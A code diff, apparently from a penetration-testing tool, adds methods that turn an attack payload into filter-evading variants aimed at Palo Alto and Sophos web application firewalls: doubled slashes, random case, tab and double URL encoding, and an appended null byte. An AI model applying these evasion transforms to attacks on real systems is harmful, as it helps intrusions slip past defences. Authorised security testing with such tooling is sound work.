@@ -365,6 +365,39 @@ export class WAFBypasses {
 	}
 
 	/**
+	 * Palo Alto Networks specific bypasses
+	 */
+	static panosBypass(payload: string): string[] {
+		const bypasses = [payload];
+
+		// PAN-OS path obfuscation and encoding variations
+		bypasses.push(payload.replace(/\//g, '//'));
+		bypasses.push(payload.replace(/\//g, '/./'));
+		bypasses.push(this.randomCase(payload));
+
+		// Use tab as space alternative
+		bypasses.push(payload.replace(/\s/g, '%09'));
+
+		return [...new Set(bypasses)];
+	}
+
+	/**
+	 * Sophos WAF specific bypasses
+	 */
+	static sophosBypass(payload: string): string[] {
+		const bypasses = [payload];
+
+		// Sophos WAF case-sensitivity and parameter pollution
+		bypasses.push(this.randomCase(payload));
+		bypasses.push(PayloadEncoder.doubleUrlEncode(payload));
+
+		// Add null byte (sometimes bypasses filters)
+		bypasses.push(payload + '%00');
+
+		return [...new Set(bypasses)];
+	}
+
+	/**
 	 * Generate random case variations
 	 */
 	private static randomCase(str: string): string {
